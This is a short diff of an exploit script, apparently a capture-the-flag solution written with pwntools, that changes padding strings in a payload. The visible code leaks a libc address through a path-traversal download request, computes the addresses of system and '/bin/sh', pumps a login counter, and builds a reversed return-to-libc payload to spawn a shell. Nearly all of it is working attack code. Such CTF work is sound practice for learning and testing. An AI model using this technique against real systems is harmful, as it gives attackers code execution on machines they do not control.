@@ -32,7 +32,7 @@ print r.recvuntil("Choice:")
 join("asdf", "asdf", "asdf", 10)
 login("admin", "P3ssw0rd")
 
-download("/../bb/../")
+download("/../AAAA/../")
 
 libc = u32(r.recvuntil("/")[-4:][::-1])
 libc_base = libc - 0x5fa2f
@@ -42,7 +42,7 @@ binsh = libc_base + 0x15902b
 for i in range(0x2e):
 	login("admin", "P3ssw0rd") # login cnt=0x2f now!
 
-payload = "/../../cccccccc" # reverse input
+payload = "/../../AAAAAAAA" # reverse input
 payload += p32(binsh)[::-1]
 payload += "AAAA"
 payload += p32(system)[::-1]
